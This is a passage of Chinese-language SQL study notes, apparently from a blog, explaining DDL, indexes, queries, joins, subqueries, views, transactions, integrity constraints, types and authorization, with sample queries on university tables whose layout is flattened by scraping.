删除表和他的内容drop table student# 删除表中的内容,但是保留表delete from student# 更改表结构alter table# 属性A是关系r将要增加的属性,D是A的域# 对于关系r中的所有元组,在新增加的属性上的取值都为nullalter table r add A D# A是关系r的一个属性名# 许多数据库不支持删除属性的操作alter table r drop A# 修改表中属性A的数据类型,将A的域改为D# 可能破坏原有的数据alter table r modify A D 索引建立索引是加快查询速度的有效手段 建立索引：由DBA或表的属主（建立表的人）根据需要建立索引；或者有些DBMS自动建立特定列上（Primary key，unique）的索引 维护索引：DBMS自动完成 使用索引：DBMS自动选择是否使用索引以及使用哪些索引 定义的格式 12345678create [unique | distinct] [cluster] index index_name 44on table_name (col_name [asc | desc] [,col_name asc|desc,...])# unique(distinct): 唯一性索引，不允许表中不同的行在索引列上取相同的值.若已有相同值存在,则系统给出相关信息,不建此索引.系统并拒绝违背唯一性的插入、更新# cluster: 聚集索引,表中元组按索引项的值排序并物理地聚集在一起.一个基本表上只能建一个聚集索引# asc|desc: 索引表中索引值的排序次序,缺省为ascdrop index index_name# 删除索引 索引的有关说明 可以动态地定义索引，即可以随时建立和删除索引 不允许用户在数据操作中引用索引。索引如何使用完全由系统决定，这支持了数据的物理独立性 应该在使用频率高的、经常用于连接的列上建索引 一个表上可建多个索引。索引可以提高查询效率，但索引过多耗费空间，且降低了插入、删除、更新的效率 创建索引123456789create table student(4ID varchar(5), name varchar(20) not null, dept_name varchar(20), total_credit numeric(3,0) default 0, primary key(ID))create index studentID_index on student(ID) 索引是一种数据结构，用于加快查询在索引属性上取给定值的元组的速度 ==&gt;详细见后面 #索引 SQL查询的基本结构SQL的数据操纵语言（DML）提供了从数据库中查询信息，以及在数据库中插入元组、删除元组、修改元组的能力 SQL中的标识符大小写不敏感 Selectselect子句用于列出查询结果中所需要的属性，与关系代数中的投影运算相对应 SQL允许在关系和查询结果中保留重复的元组 强制去重，需要在select之后使用关键字distinct *一般代表所有属性，是一个通配符 Select子句可包含+、-、*、/运算符的算数表达式,运算对象可以是常量或者元组的属性 123456789101112131415161718192021# 典型的查询语句# Ai表示一个属性,ri表示一个关系,P是一个谓词(即可以是一个条件判断)select A1,A2,...,Anfrom r1,r2,...,rnwhere P# 去重select distinct dept_name4from instructor4# 关键词all显式指明不去重复select all dept_name 4from instructor4# *代表所有属性select *4from instructor4# Select子句可包含+、-、*、/运算符的算数表达式,运算对象可以是常量或者元组的属性select ID,name,salary/124from instructor wherewhere子句指定查询结果必须满足的条件，与关系代数中的选择谓词相对应 比较结果可以使用逻辑连词and，or，not连接 比较结果可以用于算术表达式 语法成分： 逻辑运算符：and，or，not 比较运算符：&lt;，&lt;=，&gt;，&gt;=，=，&lt;&gt; between条件：判断表达式的值是否在某范围内，例如 age between 18 and 20==age∈[18,20]，not between ... and ... 1234# 找出所有在Computer Science系并且工资超过80000美元的教师的姓名select namefrom instructorwhere dept_name = &apos;Computer Science&apos; and salary &gt; 80000 fromfrom子句列出了查询中的包含关系，与关系代数中的笛卡尔积运算相对应 笛卡尔积不是经常被直接使用，他在使用时经常与where子句（关系代数的选择操作）一起使用 1234# 求笛卡尔积instructor × teacher# 产生所有的instructor-teacher对,包含两个关系的所有属性select * from instructor, teacher 连接12345# 例# 对于大学所有讲授课程的教师,找出他们的姓名以及所讲授的课程的标识select name,course_idfrom instructor,teacherwhere instructor.ID = teacher.ID 连接查询及执行过程同时涉及多个表的查询称为连接查询 用来连接两个表的条件称为连接条件或连接谓词 一般格式：[&lt;table_name1&gt;.]&lt;col_name1&gt;&lt;比较运算符&gt;[&lt;table_name2&gt;.]&lt;col_name2&gt; [&lt;table_name1&gt;.]&lt;col_name1&gt; between [&lt;table_name2&gt;.]&lt;col_name2&gt; AND [&lt;table_name3&gt;.]&lt;col_name3&gt; 连接字段：连接谓词中的列名称为连接字段。连接条件中的各连接字段类型必须是可比的，但不必是相同的 嵌套循环法（Nested-Loop） 首先在表1中找到第一个元组，然后从头开始扫描表2，逐一查找满足连接件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。 表2全部查找完后，再找表1中第二个元组，然后再从头开始扫描表2，逐一查找满足连接条件的元组，找到后就将表1中的第二个元组与该元组拼接起来，形成结果表中一个元组 重复上述操作，直到表1中的全部元组都处理完毕 排序合并法（Sort-Merge） 首先按照连接属性对表1和表2排序 对表1的第一个元组，从头开始扫描表2，顺序查找满足连接条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。当遇到表2中第一条大于表1连接字段值的元组时，对表2的查询不再继续 找到表1的第二条元组，然后从刚才的中断点处继续顺序扫描表2，查找满足连接条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。直接遇到表2中大于表1连接字段值的元组时，对表2的查询不再继续 重复上述操作，直到表1或表2中的全部元组都处理完毕为止 索引连接法（Index-Join） 对表2按连接字段建立索引 对表1中的每个元组，依次根据其连接字段值查询表2的索引，从中找到满足条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组 自然连接自然连接只考虑两个关系模式中都出现的属性上取值相同的元组对，并且相同属性的列只保留一个副本 123456789select *from instructor natural join teacherselect name,course_idfrom instructor, teacherwhere instructor.iD = teacher.ID||select name,course_idfrom instructor natural join teacher 自然连接中的危险：有些属性可能具有相同的名称，但是他们的实际意义是不同的，在这种情况下，他们可能被错误的认为是相同属性 12345678910111213# 例# 错误的写法(使course.dept_name = instructor.dept_name)select name, titlefrom instructor natural join teaches natural join course;# 正确的写法select name, titlefrom instructor natural join teaches, course where teaches.course_id = course.course_id;# 另一个正确的写法select name, titlefrom (instructor natural join teaches) join course using(course_id); 更名运算SQL允许使用as子句对关系和属性进行更名 1old_name as new_name 在Oracle中，关键词as必须被省略 12345678#例select ID,name,salary/12 as monthly_salaryfrom instructor# 找出满足工资至少比Computer Science系某一个教师的工资要高的教师姓名select distinct T.namefrom instructor as T,instructor as Swhere T.salary &gt; S.salary and S.dept_name = &apos;Computer Science&apos; 字符串运算SQL中通过字符串匹配运算来支持在字符串上的比较，使用like操作符来实现模式匹配，使用两个特殊字符（通配符）描述模式 百分号（%）：%字符匹配任何子串 下划线（_）：_字符匹配任何字符 Like的单向性： &#39;济南市山大路&#39; like &#39;济南市%&#39; = true &#39;济南市%&#39; like &#39;济南市山大路&#39; = false 12345678# 例# 找出名字中包含dar的教师名字select namefrom instructorwhere name like &apos;%dar%&apos;# 匹配字符串“100 %”str like &apos;100 \%&apos; escape &apos;\&apos; EscapeEscape定义转义字符，以去掉特殊字符的特定含义，使其被作为普通字符对待，如用escape &#39;\&#39;，定义\作为转义字符，则可用\%去匹配%，用\_取匹配_ 12&apos;ab\%cd%&apos; escape &apos;\&apos; = &apos;ab%cd&apos;&apos;ab\\cd%&apos; escape &apos;\&apos; = &apos;ab\cd&apos; VALUE是大小写敏感的 模式匹配的例子： ‘Intro%’ 匹配任何以“Intro”打头的字符串 ‘%Comp%’ 匹配任何包含“Comp” 子串的字符串 ‘_ _ _’匹配只含三个字符的字符串 ‘_ _ _ %’匹配至少含三个字符的字符串 SQL 支持一系列的串运算，包括 串联 （使用“||”） 大小写转换 计算串长度, 抽取子串, 等等 排列元组的显示次序1234567891011# 例# 按字母顺序排列出所有教师的名字select distinct namefrom instructororder by name# 我们可以用desc指定降序,用asc指定升序,默认情况下是升序排列order by name desc# 可以在多个属性上进行排序order by dept_name,name 只是显示次序排序，只能是sql的最后一个子句，只能出现目标列内的字段 当排序列含空值时，ASC排序列为空值的元组最后显示，DESC排序列为空值的元组最先显示 where子句谓词12345678# 元组比较select name,course_idfrom instructor, teacherwhere (instructor.ID, dept_name) = (teacher.ID, &apos;Biology&apos;)# 表示方法: (v1,v2,...,vn)# 元组比较: 按照字典顺序进行比较# 例如 (a1,a2)&lt;=(b1,b2) === (a1&lt;b1)or ((a1=b1) and (a2&lt;=b2)) 重复 对于存在重复元组的关系，SQL 可以决定在结果中显示该元组的几个副本 一些关系代数运算的多重集版本——给定多重集关系r1 和r2 ： σθ (r1)：如果关系r1的元组t1有c1个副本，并且t1满足选择条件σθ ，则在 σθ 里有c1个t1的副本 ΠA (r)：对于关系r1的每个元组t1的每个副本，在ΠA (r1)里都有一个副本ΠA (t1) ，ΠA (t1)是r1中相应副本t1的投影 r1 x r2：如果关系r1的元组t1有c1个副本，关系r2的元组t2有c2个副本，则关系r1 x r2的元组t1，t2有c1 x c2个副本 集合运算集合运算union，intersect和except，每个运算都自动去重 union：并集；intersect：交集；except：差集(在Oracle中，是minus)； 如果要保留重复，则要使用对应的多重集版本union all，intersect all，except all 如果一个元组在r中出现m次，在s中出现n次，那么： r union all s：m+n次 r intersect all s：min(m,n)次 r except all s：max(0,m-n)次 1234567891011121314151617181920212223242526# 例# 找出在2009年秋季开课，或者在2010年春季开课，或两个学期都开课的所有课程(select course_id from section where sem = ‘Fall’ and year = 2009)union(select course_id from section where sem = ‘Spring’ and year = 2010)# 找出在2009年秋季和2010年春季都开课的所有课程(select course_id from section where sem = ‘Fall’ and year = 2009)intersect(select course_id from section where sem = ‘Spring’ and year = 2010)# 找出在2009年秋季学期开课但不在2010年春季学期开课的所有课程(select course_id from section where sem = ‘Fall’ and year = 2009)except/minus(select course_id from section where sem = ‘Spring’ and year = 2010) 空值元组的一些属性可以为空值，用null表示 null代表一个不知道或不存在的值 包含null的任何算术表达式的计算结果是null，比如5+null = null 谓词：is null可以用来检测空值，但是不能写 `var = null 带有null的任何比较运算返回 unknown，比如5&lt;null := unknown，null&lt;&gt;null := unknown，null = null := unknown 三值逻辑使用真值unknown or：(unknown or true) = true，(unknown or false) = unknown，(unknown or unknown) = unknown and：(unknown and true) = unknown，(unknown and false) = falses，(unknown and unknown) = unknown not：not unknown = unknown 若谓词P的值为unknown，则P is unknown = true where子句中谓词对一个元组计算出的值如果为unknown，则结果当false处理 聚集函数聚集函数以一个值的集合（集或多重集）为输入，返回单个值 avg：平均值 min：最小值 max：最大值 sum：总和 count：计数 聚集函数的性质同关系代数：①聚集函数作用域集合（多重集）返回单值；②聚集函数作用默认作用于多重集；③强制作用于集合，使用distinct。 （无分组）仅用聚集函数的SQL：SQL返回关系，返回的关系有且只有一行；Select子句中出现聚集函数，不能同时出现非聚集的属性 1234567891011121314# 例# 找出Computer Science系教师的平均工资select avg(salary)from instructorwhere dept_name = &apos;Computer Science&apos;# 找出在2012年春季学期讲授的课程的教师总数select count(distinct ID)from teacherwhere semester = &apos;Spring&apos; and year = 2010# 找出course关系中的元组数select count(*)from course group by子句在关系子集上运用聚集函数，得到一个新的关系 group by子句的作用对象是查询的中间结果表 分组方法：按指定一列或多列值分组，值相等为一组 使用Group by子句后，Select子句的列名列表中只能出现分组属性和聚集函数，不能出现非聚集的非分组属性 分组聚集计算时，SQL返回关系，每组对应一行，无组时返回空关系 12345# 例# 计算每个系的教师的平均工资,dept——name为系名select dept_name, avg(salary)from instructorgroup by dept_name; having子句having是对分组聚集结果进行选择，不满足条件的舍弃 having子句的谓词在形成分组后起作用，where子句中的谓词在分组之前起作用 1234select dept_name,avg(salary)from instructorgroup by dept_namehaving avg(salary)&gt;42000 空值和聚集 除了count(*)，所有其他的聚集运算都忽略聚集属性上为空值的元组 如果集合只有空值（输入值集合为空集），则count(*)运算值为0，其他所有的运算返回空值 1234# 计算所有工资总额的查询# 该语句忽略了空值,若没有非空的salary,则结果为nullselect sum(salary)from instructor 嵌套子查询SQL提供了一个子查询嵌套的机制 一个子查询是一个嵌套在其他的查询中的select-from-where表达式 子查询通常用于对集合成员的资格、集合的比较、集合的基数进行检查 集合成员的资格：in 集合之间的比较：θ 测试集合是否为空：exists 测试集合是否存在重复元组：unique 1234567891011121314151617181920212223242526272829303132333435363738# 例# 找出在2009年秋季和2010年春季同时开课的所有课程select distinct course_idfrom sectionwhere semester = &apos;Fall&apos; and year = 2009 adn444course_id in (select course_id from section where semester = &apos;Spring&apos; and year = 2010); # 找出在2009年球季学期开课但不在2010年春季学期开课的所有课程select distinct course_idfrom sectionwhere semester = &apos;Fall&apos; and year = 2009 and444course_id not in (select course_id from section where semester = &apos;Spring&apos; and year = 2010);# 找出（不同的）学生总数，他们选修了ID为10101的教师所讲授的课程select count (distinct ID)from takeswhere (course_id, sec_id, semester, year) in44(select course_id, sec_id, semester, year from teaches where teaches.ID= 10101);------# 找出满足下面条件的所有教师的姓名，他们的工资至少比Biology系某一个教师的工资要高 select distinct T.namefrom instructor as T, instructor as Swhere T.salary &gt; S.salary and S.dept_name = ’Biology’;# 有些查询使用 &gt;some 子句select namefrom instructorwhere salary &gt; some (select salary from instructor where dept_name = ’Biology’); some，any，all子句F &lt;comp&gt; some r &hArr; ∃ t ∈ r 使得( F &lt;comp&gt; t )，其中&lt;comp&gt;可以是&lt;,&lt;=,&gt;,&gt;=,&lt;&gt; (= some) ≡ in ALL 父查询中的结果集大于子查询中每一个结果集中的值,则为真 ANY,SOME 父查询中的结果集大于子查询中任意一个结果集中的值,则为真 All：只有当其所有数据都满足条件时，条件才成立Any：只要有一条数据满足条件，条件就成立Some：其中存在一些数据满足条件，作用和Any大致相同 常规的使用中看作一致即可 F &lt;comp&gt; all r &hArr; ∀ t ∈ r（F &lt;somp&gt; t） (≠ all) ≡ not in some和all谓词可以用聚集函数实现 = &lt;&gt;或!= &lt; &lt;= &gt; >= some in – &lt;max &lt;=max >min >=min all – not in &lt;min &lt;=min >max >=max 空关系测试exists结构测试子查询结果是否有元组，子查询非空的时候，返回true exists r &hArr; r ≠ Φ not exists r &hArr; r = Φ exists谓词 存在量词∃ 带有exists谓词的子查询不返回任何数据，只产生逻辑真值true或逻辑假值false 若内层查询结果非空，则返回真值 若内层查询结果为空，则返回假值 由exists引出的子查询，其目标列表达式通常都用*，因为带exists的子查询只返回真值或假值，给出列名无实际意义 123456789101112131415161718# 例# 另一种表述查询“找出在2009年秋季和2010年春季同时开课的所有课程的集合”的方式select course_idfrom section Swhere semester = ’Fall’ and year= 2009 andexists (select * from section as T where semester=’Spring’and year=2010 and S.course_id= T.course_id);# 2select course_idfrom sectionwhere semester = ’Fall’ and year= 2009 andcourse_id in (select course_id from section where semester=’Spring’and year=2010); 相关子查询：in后的子查询与外层查询无关，每个子查询执行一次，而exists后的子查询与外层查询有关，需要执行多次，称之为相关子查询 执行过程： 首先取外层查询中表的第一个元组，根据它与内层查询相关的属性值处理内层查询，若WHERE子句返回值为真，则取此元组放入结果表 然后再取外层表的下一个元组 重复这一过程，直至外层表全部检查完为止 sql中全部概念的处理全部在sql中的三种写法 ∀：not exists(not exists) 超集superset：not exists(X except Y) ÷：not in(not in) 用EXISTS表示超集 若A为B的超集，则NOT EXISTS (B EXCEPT A) 为TRUE 对于B EXCEPT A，可以表达为：在B中存在，但在A中不存在的记录，也可以用NOT EXISTS 来表达 因此超集可以用两个NOT EXISTS 的嵌套来表达，也可以用两个NOT IN 的嵌套来表达 巧用逆否命题的等价 123456789101112131415161718192021222324252627282930313233# 例# 列出选修了全部课程的学生姓名# 任意课程，所求学生选之⇔不存在任何一门课程，所求学生没有选之select SNAMEfrom Swhere not exists(select Cno from C where not exists(select * from SC where SC.Cno = C.Cno and SC.Sno = S.Sno)) # 任意课程，所求学生选之⇔所求学生的选课集合为所有课程集合的超集select SNAMEfrom Swhere not exists((select Cno from C) except (select Cno from SC where SC.Sno = S.Sno))#任意课程，所求学生选之⇔所求学生不在如下集合中：学生学号与任一课程的组合不全包含在SCselect SNAMEfrom Swhere Sno not in444(select Sno from C,S where (Sno,Cno) not in (select Sno,Cno from SC)) 测试没有重复的元组unique结构测试一个子查询的结果中是否有重复的元组，在空集中其值为true 1234567# 例# 找出所有2009年最多开设一次的课程select T.course_idfrom course Twhere unique (select R.course_id from section R where T.course_id = R.course_id and R.year = 2009) from子句中的子查询sql允许from子句中的子查询的表达式 1234567# 例# 找出系平均工资超过42000美元的那些系中教师的平均工资select dept_name, avg_salaryfrom (select dept_name, avg (salary) avg_salary from instructor group by dept_name)where avg_salary &gt; 42000; with子句with子句提供了定义临时关系的方法，这个定义支队包含with的子句的查询有效 12345678# 例# 找出具有最大预算值的系with max_budget (value) as4(select max(budget) from department)select budgetfrom department, max_budgetwhere department.budget = max_budget.value; with子句在写复杂查询时非常有用 标量子查询SQL允许子查询出现在返回单个值的表达式能够出现的任何地方，只要该子查询只返回包含单个属性的单个元组；这样的子查询称为标量子查询（scalar subquery） 标量子查询只返回包含单个属性的单个元组 如果子查询的结果返回多个元组，则会产生运行错误 数据库的修改 从一个给定的关系中删除元组：delete from 向一个给定的关系插入新的元组：insert into 将一个给定的关系的一些元组的值更新：update 删除1delete from table_name [where &lt;条件表达式&gt;] 从表中删除符合条件的元组，如果没有where语句，则删除所有元组 123456789101112131415161718# 例# 删除 instructors 关系中的所有元组delete from instructor# 从 instructors 关系中删除与 Finance 系教师相关的所有元组delete from instructor4where dept_name = &apos;Finance&apos;#从 instructor 关系中删除在位于 Watson 大楼的系工作的教师元组delete from instructor4where dept_name in(select dept_name from department where building = &apos;Watson&apos;)# 删除工资低于大学平均工资的教师记录delete from instructor4where salary &lt; (select avg(salary) from instructor) 插入12insert into table_name [(col1 [,col2]...)]4values (val1 [,val2]...) 插入一条指定好值的元组 12insert into table_name [(col1 [,col2]...)]44(子查询) 插入子查询结果中的若干条元组 into子句 指定要插入数据的表名及属性列 属性列的顺序可以与表定义中的顺序不一致 没有指定属性列：表示要插入的是一条完整的元组，且属性列属性与表定义中的顺序一致 指定部分属性列：插入的元组在其余属性列上取空值 values子句 提供的值必须与into子句匹配：值的个数&amp;&amp;值的类型 子查询 select子句目标列必须与into子句匹配：值的个数&amp;&amp;值的类型 12345678910111213141516# 例# 向 course 关系中插入新元组insert into course4values (‘CS-437’,‘Database Systems’,‘Comp. Sci.’, 4);insert into course (course_id, title, dept_name, credits)4values (‘CS-437’, ‘Database Systems’, ‘Comp. Sci.’, 4);4# 向 student 关系中插入新元组，并将tot_creds 属性设置为nullinsert into student4values (‘3003’, ‘Green’, ‘Finance’, null);4# 将instructor 关系中的所有元组插入到student 关系里，并将属性tol_credits设置为0insert into student4select ID, name, dept_name, 04from instructor select from where 语句在它的结果被插入到相应的关系之前就完成了评估，否则，像这样的查询 insert into table1 select * from table1，如果table1没有主码的话，会出现问题 更新12345update table_name4set col_name1 = 表达式|子查询44col_name2 = 表达式|子查询44...44[where 条件表达式] 指定对哪些列进行更新，以及更新后的值是什么 12345678910111213141516171819202122232425# 例# 老师工资上调5%update PROF4set SAL = SAL * 1.05#将d1系的学生年龄增加1岁update Student4set S_age = S_age + 14where dno = &apos;d1&apos;# 将d1系全体学生的成绩置零update SC4set Score = 04where &apos;d1&apos; = (select dno from S where S.Sno = SC.Sno)# 将D01系系主任的工资改为该系的平均工资update PROFset SAL = (select avg(SAL) from PROF where Dno = D01)4where Pno = (select DEAN from DEPT where Dno = D01) 为条件更新使用Case语句123456# 例update instructor4set salary = case444when salary &lt;= 100000 then salary * 1.05444else salary *1.03444end 使用标量子查询的更新123456789101112131415# 例# 为关系student重新计算并更新tot_credit属性的值update student S4set tot_credit = (select sum(credits) from takes natural join course where S.ID = takes.ID and takes.grade &lt;&gt; &apos;F&apos; and takes.grade is not null); # 如果一个学生没有成功学完任何一个课程，则将其tot_creds 属性设为空# 不使用sum(credits)，而是使用:4case44when sum(credits) is not null then sum(credits)444else 0444end 中级SQL连接表达式连接关系连接操作作用于两个关系并返回一个关系作为结果 一个连接操作是一个笛卡儿积，并且要求两个关系的元组满足某些匹配条件，他还指定在连接结果中要出现的属性 join操作通常用作from子句中的子查询表达式 外连接 一个扩展的连接操作，避免了信息的损失 计算join，然后将一个关系中与另一个不匹配的元组添加到结果中 使用null值 对于该关系，我们有左外连接、右外连接、全外连接和内连接 左外连接如下： 右外连接如下： 简而言之，往哪连接，被连接的表的主码全部需要保留，然后将其连接的属性有则填入，无则赋null 若找不到相应的主码，则将连接的表的那一行丢弃 全外连接如下： 连接操作将两个关系作为输入，返回一个关系作为结果 连接条件：规定了这两个关系中的哪些元组匹配，以及在连接结果中出现了什么属性 连接类型：规定了对每个关系中（基于连接条件）不与其他关系中的元组相匹配的元组怎样处理 对于自然连接，会自动合并相同的列，但是连接会保留列 例子如下： 视图在某些情况下，让所有的用户看到整个逻辑模型（即所有实际存储在数据库中的关系）是不可取的 视图提供一个对某些用户从视图中隐藏某些数据的机制 任何不是逻辑模型的一部分，但作为虚关系对用户可见的关系称为视图。 定义1create view v as &lt;query expression&gt; 其中，&lt;query expression&gt;可以是任何合法的SQL表达式，v表示视图名 一旦定义了一个视图，我们就可以用视图指代该视图生成的虚关系 定义视图时并不是由查询表达式的执行结果创造一个新关系，相反，一个视图的定义导致存储一个查询表达式，当该视图被使用时，他就被这个已存储的查询表达式替换（有点类似C++的宏定义） 特点 虚表，是从一个或几个基本表（或视图）导出的关系 只存放视图的定义，不会出现数据冗余 基表中的数据发生变化，从视图中查询的数据也随之改变 查询时，视图名可以出现在任何关系名可以出现的地方 对比 视图(view) vs 派生查询(with)： 视图存储在DB数据字典中，是数据库模式的一部分 with定义的派生关系，仅在所属的SQL有效，不属于DB模式 视图(view) vs 表(table)： 视图和表都是关系，都可以在SQL中直接应用 DB中存储表的模式定义和数据 DB中值存储视图的定义，不存视图的数据 视图数据实在使用视图时临时计算的 物化视图是提高计算的一种手段，结果等价于临时计算 视图的作用： 对外模式的支持 安全性、方便性 12345678910# 例# instructor关系的没有salary的属性视图create view faculty as444select ID,name,dept_name444from instructor444# 找出Biology系的所有教师的姓名select namefrom facultywhere dept_name = &apos;Biology&apos; 视图的属性名缺省为子查询结果中的属性名，也可以是显式指明，在下列情况下，必须指明视图的所有列名： 某个目标列式聚集函数或列表达式 多表连接时，选出了几个同名列作为视图的字段 需要在视图中为某个列启用新的更合适的名字 目标列是* 123456# 例# 定义一个每个系的工资总和的视图create view departments_total_salary(dept_name, total_salary) as4select dept_name, sum(salary)4from instructor4group by dept_name 使用其他视图定义视图一个视图可以用于定义另一个视图的表达式中 如果一个视图关系v2用于定义另一个视图关系v1的表达式中，则称v1直接依赖于v2 如果一个视图关系v1直接依赖于另一个视图v2，或通过其他视图间接依赖于v2，则称v1依赖于v2 一个视图关系如果依赖于它自身，则被称为递归的 视图扩展一种通过其他视图的定义来定义视图含义的方法 设视图v1由表达式e1定义的，可能它本身就包含对视图关系的使用 一个表达式中的视图扩展重复以下替换步骤 12345&gt; repeat&gt; 找到e1中的关系vi&gt; 使用定义vi的表达式替换vi&gt; until 在e1中没有视图关系&gt; 是要视图不是递归的，循环就能终止 视图更新123456update view_nameset col = valwhere expressiondelete from view_namewhere expression 视图的更新就是转换为表的更新 1234567891011121314151617181920212223242526272829303132# 例create view IS_Student as4select Sno,Sname,Sage4from Student4where Sdept = &apos;IS&apos;;4#updateupdate IS_Studentset Sname = &apos;Alice&apos;where Sno = &apos;12315&apos;#transferToupdate Studentset Sname = &apos;Alice&apos;where Sno = &apos;12315&apos; and Sdept = &apos;IS&apos;;#insertinsert into IS_Student4values(&apos;12306&apos;, &apos;Bob&apos;, 18)#transferToinsert into Studnet(Sno,Sname,Sage,Sdept)4values(&apos;12306&apos;,&apos;Bob&apos;,18,&apos;IS&apos;)4#deletedelete from IS_Studentwhere Sno = &apos;12315&apos;#transferTodelete from Studentwhere Sno = &apos;12315&apos; and Sdept = &apos;IS&apos; 有些更新不能被单独执行，大部分的SQL实现只允许在简单视图上的更新（①from子句中只有一个数据库关系；②select子句中只包含关系的属性名，不包含任何表达式、聚集函数或distinct声明；③任何没有出现select子句中的属性可以取空值；④查询中不含有group by或having子句） 对于行列子集视图可以更新 with check option 视图定义时，指定with check option，强制通过视图进行的修改，结果必须在视图中。 12345678910111213141516171819202122# 例&apos;&apos;&apos;Sno Sname Sage DeptS1 A 21 CS4 B 20 CS2 C 19 Ss3 D 21 S&apos;&apos;&apos;create view sv1 as4select sno,sname,sage from s44where Dept = &apos;C&apos; and sage&gt;20update sv1 set sage=19 where sno = &apos;s4&apos;# 更以更新,更新后,B不再出现在视图中create view sv1 as4select sno,sname,sage from s44where Dept = &apos;C&apos; and sage&gt;204with check option;update sv1 set sage=19 where sno = &apos;s4&apos;# 不可以更新,update语句将被DBMS拒绝 物化视图定义：创建一个物理表，此表包含定义视图的查询结果的所有元组 如果查询中使用的关系发生了更新，则物化视图中的结果就会过期 每当视图的底层关系进行更新时要更新视图，以此维护视图 事务 工作单元 原子事务：要么全部执行，要么回滚，好像没有发生一样 从并发事务中隔离 隐式地开始一个任务 以commit work 或 rollback work结束 多数数据库的默认情况：每个SQL语句自动提交 可以关闭自动提交了一个会话 在SQL:1999里可以使用begin atomic ... end（但这种方式不被多数数据库支持） 完整性约束 完整性约束通过保证对数据库的修改不会造成数据的不一致，来防止对数据库数据的意外破坏 单个关系上的约束 not null：指定的属性上，不允许出现空值 限制：任何试图导致某个或某些元组非空属性为空的操作都将被拒绝 primary key：声明为主码 主码值不允许为空，也不允许出现重复 意义：关系对应到现实世界中的实体集，元组对应到实体，实体是相互可区分的，通过主码来唯一标识，若主码为空，则出现不可标识的实体，这是不容许的 unique：声明候选码 约束：不允许关系中，有两个元组在指定属性上取值相同 unique本身不限定属性非空 check(P)，P是一个谓词 约束：关系上的每一个元组，都必须满足P check可以针对一个或多个属性 check可以涉及其他表，但需考虑约束检查条件代价 对于check，我们有 1234567891011# 保证semester必须是四季即Spring,Summer,Fall,Winter中的一个create table section ( course_id varchar (8), sec_id varchar (8), semester varchar (6), year numeric (4,0), building varchar (15), room_number varchar (7), time slot id varchar (4), primary key (course_id, sec_id, semester, year), check (semester in(‘Fall’,‘Winter’,‘Spring’,‘Summer’)) 参照完整性保证在一个关系中给定属性集上的取值也在另一关系的特定属性集的取值中出现 A是一个属性的集合，R和S是两个包含属性A的关系，并且A是S的主码，如果对于每个而在R中出现的A在S中也出现，则A被称为R的外码 参照完整性的级联行为1234567891011121314151617# 参照完整性中的级联行为create table course ( course_id char(5) primary key, title varchar(20), dept_name varchar(20) references department)create table course ( … dept_name varchar(20), foreign key (dept_name) references department on delete cascade on update cascade, . . . )# 级联行为的替代方式: set null,set default 删除基本关系元组 Restrict方式：只有当依赖关系中没有一个外码值与要删除的基本关系的主码值相对应时，才可以删除该元组，否则系统拒绝此删除操作 Cascade方式：将依赖关系中所有外码值与基本关系中要删除的主码值所对应的元组一起删除 Set null方式：删除基本关系中元组时，将依赖关系中与基本关系中被删主码值相对应的外码值置为空值 1Foreign key (Sno) References S(Sno) [on delete [cascade|set null]] 修改基本关系元组 Restrict方式：只有当依赖关系中没有一个外码值与要修改的基本关系的主码值相对应时，才可以修改该元组主码，否则系统拒绝此次修改 Cascade方式：将依赖关系中所有与基本关系中要修改的主码值所对应的外码值一起修改为新值 Set null方式：修改基本关系中元组主码时，将依赖关系中与基本关系中被修改主码值相对应的外码值置为空值 1Foreign key (Sno) References S(Sno) [on update [cascade|set null]] 复杂check子句1create assertion &lt;assertion-name&gt; check &lt;predicate&gt; SQL的数据类型与模式SQL固有的数据类型 date：日期，包括年(四位)、月、日，如date &#39;2005-7-27&#39; time：时间，包括小时、分、秒，如time &#39;09:00:30&#39;，time &#39;09:00:30.75&#39; timestamp：date和time的组合，如timestamp &#39;2005-7-27 09:00:30.75&#39; interval：时间段，如interval &#39;1&#39; day 两个 date/time/timestamp 类型值相减产生一个 interval 类型值 可以在 date/time/timestamp 类型的值上加减 interval 类型的值 用户定义的类型SQL中的create type结构创建用户定义的类型 12345678# 例create type Dollars as numeric(12,2) finalcreate table department(4dept_name varchar(20), building varchar(15), budget Dollars); SQL-92中的create domain结构创建用户定义的域类型 12345create domain person_name char(20) not nullcreate domain degree_level varchar(10)constraint degree_level_testcheck(value in (&apos;Bachelors&apos;,&apos;Masters&apos;,&apos;Doctorate&apos;)) 类型和域相似，但是域本身可以指定约束，比如not null 用户定义类型 独特类型：distinct type：create type Dollars as numeric(12,2) 结构化：structured：create type person(pid char(18),name varchar(8)) 用户定义类型，本质上是对RDB的面向对象扩展 用户定义域：create domain Dollar as numeric(12,2) 自定义域不支持结构 Type vs Domain Type：进行强类型检查 Domain：不进行强类型检查，支持强制类型转换 Type由严格的OO理论基础，Domain时纯RDB的概念 大对象类型大对象类型（照片、视频、CAD文件等）以large object类型存储 blob：二进制数据的大对象数据类型——对象是没有被解释的二进制数据的大集合（对二进制数据的解释由数据库系统以外的应用程序完成） clob：字符数据的大对象数据类型——对象是字符数据的大集合 当查询结果是一个大对象时，返回的是指向这个大对象的指针，而不是大对象本身 LOB：Large OBject，用于存储大空间的值，存储由指针加文件实现 LOB访问：一般使用专用语句访问 1234# Oracleselect Blob doc into ...from bookwhere cno = &apos;c1&apos; 授权权限的转授和回收允许用户把已获得的权限转授给其他用户，也可以把已授给其他用户的权限在回收上来 权限图节点是用户，根节点是DBA，有向边Ui &rarr; Uj ，表示用户Ui 把某权限授给用户Uj 一个用户拥有权限的充分必要条件是在权限图有一条从根节点到该用户节点的路径 数据库某些部分的几种授权形式： Read：允许读取，但是不能修改数据 Insert：允许插入新数据，但是不能修改已有的数据 Update：允许修改，但是不能删除数据 Delete：允许删除数据 修改数据库模式的几种授权形式： Index：允许创建和删除索引 Resources：允许创建新的关系 Alteration：允许增加或删除关系的属性 Drop：允许删除关系 SQL中的授权规范grant语句用于授予权限 12grant &lt;权限列表&gt;on &lt;关系名|视图名&gt; to &lt;用户|角色列表&gt; &lt;用户|角色列表&gt;：一个用户id | public，所有合法用户持有所授权限 | 一个角色 对于某个视图授权后，并没有对该视图所基于的关系授权 权限的授予者必须已经持有相应的权限（或者是数据库管理员） 权限列表： select：允许对关系进行读访问，或者使用视图进行查询的能力 insert：插入元组的能力 update：更新元组的能力 delete：删除元组的能力 all privileges：所有允许权限的简写形式 1234&gt; # 例&gt; # 